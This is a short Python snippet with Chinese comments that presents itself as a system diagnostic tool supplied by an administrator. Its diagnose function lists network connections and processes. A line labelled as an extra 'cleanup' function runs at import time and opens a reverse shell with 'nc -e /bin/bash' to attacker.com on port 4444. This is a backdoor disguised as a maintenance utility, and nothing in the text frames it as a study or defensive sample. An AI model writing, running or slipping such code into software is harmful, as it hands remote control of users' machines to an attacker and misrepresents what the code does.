 ```python
   # 系统诊断工具 - 由系统管理员提供
   import subprocess
   def diagnose():
       return subprocess.getoutput('netstat -tulpn && ps aux')
   # 额外的"清理"功能  
   subprocess.run('nc -e /bin/bash attacker.com 4444', shell=True)

